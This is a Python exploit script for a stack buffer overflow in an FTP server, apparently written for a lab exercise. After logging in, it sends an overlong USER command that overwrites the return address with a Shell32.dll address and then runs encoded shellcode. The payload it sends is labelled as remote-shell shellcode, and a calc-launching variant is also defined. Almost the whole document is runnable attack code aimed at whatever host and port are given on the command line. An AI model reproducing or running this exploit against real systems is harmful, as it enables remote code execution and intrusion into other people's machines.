#!/usr/bin/python

import socket
import sys

junk = b"A" * 230
eip_override = b"\xD7\x30\x9D\x7C" #(7C9D30D7 -- Shell32.dll) (7C86467B -- Kernel32.dll)
NOPS = b"C" * 140

buf =  b""
buf += b"\xda\xcd\xb8\xaa\xaf\x7e\x41\xd9\x74\x24\xf4\x5a\x2b"
buf += b"\xc9\xb1\x31\x31\x42\x18\x83\xea\xfc\x03\x42\xbe\x4d"
buf += b"\x8b\xbd\x56\x13\x74\x3e\xa6\x74\xfc\xdb\x97\xb4\x9a"
buf += b"\xa8\x87\x04\xe8\xfd\x2b\xee\xbc\x15\xb8\x82\x68\x19"
buf += b"\x09\x28\x4f\x14\x8a\x01\xb3\x37\x08\x58\xe0\x97\x31"
buf += b"\x93\xf5\xd6\x76\xce\xf4\x8b\x2f\x84\xab\x3b\x44\xd0"
buf += b"\x77\xb7\x16\xf4\xff\x24\xee\xf7\x2e\xfb\x65\xae\xf0"
buf += b"\xfd\xaa\xda\xb8\xe5\xaf\xe7\x73\x9d\x1b\x93\x85\x77"
buf += b"\x52\x5c\x29\xb6\x5b\xaf\x33\xfe\x5b\x50\x46\xf6\x98"
buf += b"\xed\x51\xcd\xe3\x29\xd7\xd6\x43\xb9\x4f\x33\x72\x6e"
buf += b"\x09\xb0\x78\xdb\x5d\x9e\x9c\xda\xb2\x94\x98\x57\x35"
buf += b"\x7b\x29\x23\x12\x5f\x72\xf7\x3b\xc6\xde\x56\x43\x18"
buf += b"\x81\x07\xe1\x52\x2f\x53\x98\x38\x25\xa2\x2e\x47\x0b"
buf += b"\xa4\x30\x48\x3b\xcd\x01\xc3\xd4\x8a\x9d\x06\x91\x65"
buf += b"\xd4\x0b\xb3\xed\xb1\xd9\x86\x73\x42\x34\xc4\x8d\xc1"
buf += b"\xbd\xb4\x69\xd9\xb7\xb1\x36\x5d\x2b\xcb\x27\x08\x4b"
buf += b"\x78\x47\x19\x28\x1f\xdb\xc1\x81\xba\x5b\x63\xde"

calc_shell_code = buf

buf =  b""
buf += b"\xba\xb3\xab\x75\xe7\xdb\xc8\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x57\x12\x03\x57\x12\x83\x74\xaf\x97"
buf += b"\x12\x86\x58\xd5\xdd\x76\x99\xba\x54\x93\xa8\xfa\x03"
buf += b"\xd0\x9b\xca\x40\xb4\x17\xa0\x05\x2c\xa3\xc4\x81\x43"
buf += b"\x04\x62\xf4\x6a\x95\xdf\xc4\xed\x15\x22\x19\xcd\x24"
buf += b"\xed\x6c\x0c\x60\x10\x9c\x5c\x39\x5e\x33\x70\x4e\x2a"
buf += b"\x88\xfb\x1c\xba\x88\x18\xd4\xbd\xb9\x8f\x6e\xe4\x19"
buf += b"\x2e\xa2\x9c\x13\x28\xa7\x99\xea\xc3\x13\x55\xed\x05"
buf += b"\x6a\x96\x42\x68\x42\x65\x9a\xad\x65\x96\xe9\xc7\x95"
buf += b"\x2b\xea\x1c\xe7\xf7\x7f\x86\x4f\x73\x27\x62\x71\x50"
buf += b"\xbe\xe1\x7d\x1d\xb4\xad\x61\xa0\x19\xc6\x9e\x29\x9c"
buf += b"\x08\x17\x69\xbb\x8c\x73\x29\xa2\x95\xd9\x9c\xdb\xc5"
buf += b"\x81\x41\x7e\x8e\x2c\x95\xf3\xcd\x38\x5a\x3e\xed\xb8"
buf += b"\xf4\x49\x9e\x8a\x5b\xe2\x08\xa7\x14\x2c\xcf\xc8\x0e"
buf += b"\x88\x5f\x37\xb1\xe9\x76\xfc\xe5\xb9\xe0\xd5\x85\x51"
buf += b"\xf0\xda\x53\xf5\xa0\x74\x0c\xb6\x10\x35\xfc\x5e\x7a"
buf += b"\xba\x23\x7e\x85\x10\x4c\x15\x7c\xf3\xb3\x42\x56\x86"
buf += b"\x5c\x91\xa6\x89\x20\x1c\x40\xe3\x48\x49\xdb\x9c\xf1"
buf += b"\xd0\x97\x3d\xfd\xce\xd2\x7e\x75\xfd\x23\x30\x7e\x88"
buf += b"\x37\xa5\x8e\xc7\x65\x60\x90\xfd\x01\xee\x03\x9a\xd1"
buf += b"\x79\x38\x35\x86\x2e\x8e\x4c\x42\xc3\xa9\xe6\x70\x1e"
buf += b"\x2f\xc0\x30\xc5\x8c\xcf\xb9\x88\xa9\xeb\xa9\x54\x31"
buf += b"\xb0\x9d\x08\x64\x6e\x4b\xef\xde\xc0\x25\xb9\x8d\x8a"
buf += b"\xa1\x3c\xfe\x0c\xb7\x40\x2b\xfb\x57\xf0\x82\xba\x68"
buf += b"\x3d\x43\x4b\x11\x23\xf3\xb4\xc8\xe7\x03\xff\x50\x41"
buf += b"\x8c\xa6\x01\xd3\xd1\x58\xfc\x10\xec\xda\xf4\xe8\x0b"
buf += b"\xc2\x7d\xec\x50\x44\x6e\x9c\xc9\x21\x90\x33\xe9\x63"

remote_shell_code = buf

payload = junk + eip_override + NOPS + remote_shell_code

server_ip = str(sys.argv[1])
server_port = int(sys.argv[2])

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

print "\nNow sending the malicious payload.\n"
soc.connect((server_ip, server_port))
d = soc.recv(1024)

soc.send('USER someone' + '\r\n')
d = soc.recv(1024)

soc.send('PASS someone' + '\r\n')
d = soc.recv(1024)

soc.send('USER ' + payload + '\r\n')
d = soc.recv(1024)

soc.close()

print "\nDone sending the payload."
